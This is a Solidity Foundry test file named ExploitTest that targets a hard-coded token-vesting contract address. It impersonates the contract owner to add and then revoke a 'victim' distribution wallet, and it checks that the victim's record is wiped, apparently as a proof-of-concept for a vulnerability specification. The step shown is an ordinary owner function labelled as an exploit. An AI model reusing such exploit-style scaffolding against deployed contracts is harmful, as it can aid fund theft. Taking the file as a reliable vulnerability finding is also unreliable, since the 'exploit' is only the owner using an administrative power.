// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for Advisory contract to access user mapping
interface Advisory {
    struct userStruct {
        uint balance;
        uint totalClaimed;
        uint initiated;
        uint lastClaim;
    }

    function owner() external view returns (address);
    function token() external view returns (address);
    function user(address) external view returns (uint balance, uint totalClaimed, uint initiated, uint lastClaim);
    function addDistributionWallet(address[] memory account, uint[] memory amount, uint[] memory startTime) external;
    function revokeDistributionWallet(address[] memory account) external;
}

// IBEP20 interface
interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract owner
        owner = Advisory(TARGET).owner();

        // Create a victim address
        address victim = address(0x123);
        vm.label(victim, "Victim");

        // Get the token address from the contract
        address tokenAddress = Advisory(TARGET).token();
        IBEP20 token = IBEP20(tokenAddress);

        // Ensure contract has enough tokens by dealing to it
        // First, let's give tokens to the contract from somewhere
        deal(tokenAddress, TARGET, 1000 ether);

        // Also ensure owner has some tokens to cover any potential transfers
        deal(tokenAddress, owner, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create a victim address
        address victim = address(0x123);

        // Step 1: Impersonate the owner to add a distribution wallet
        vm.startPrank(owner);

        // Prepare arrays for adding distribution wallet
        address[] memory accounts = new address[](1);
        uint[] memory amounts = new uint[](1);
        uint[] memory startTimes = new uint[](1);

        accounts[0] = victim;
        amounts[0] = 100 ether; // Give victim 100 tokens
        startTimes[0] = block.timestamp + 1 days; // Start time in future

        // Add the victim as distribution wallet
        Advisory(TARGET).addDistributionWallet(accounts, amounts, startTimes);

        // Verify victim has balance > 0
        Advisory advisory = Advisory(TARGET);
        (uint balanceBefore, , , ) = advisory.user(victim);
        require(balanceBefore > 0, "Victim should have balance");

        // Step 2: Revoke the distribution wallet
        address[] memory victimsToRevoke = new address[](1);
        victimsToRevoke[0] = victim;

        // Call revokeDistributionWallet - this should delete victim's entry
        // and transfer unclaimed tokens to owner
        Advisory(TARGET).revokeDistributionWallet(victimsToRevoke);

        vm.stopPrank();

        // Step 3: Verify the oracle condition - victim balance should be 0
        (uint balanceAfter, , , ) = advisory.user(victim);

        // This is the oracle check from the vulnerability specification
        assertEq(balanceAfter, 0, "Victim balance should be 0 after revocation");

        // Additional check: Verify the struct was deleted (all fields should be 0)
        (uint bal, uint totalClaimed, uint initiated, uint lastClaim) = advisory.user(victim);
        assertEq(bal, 0, "Balance should be 0");
        assertEq(totalClaimed, 0, "Total claimed should be 0");
        assertEq(initiated, 0, "Initiated should be 0");
        assertEq(lastClaim, 0, "Last claim should be 0");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
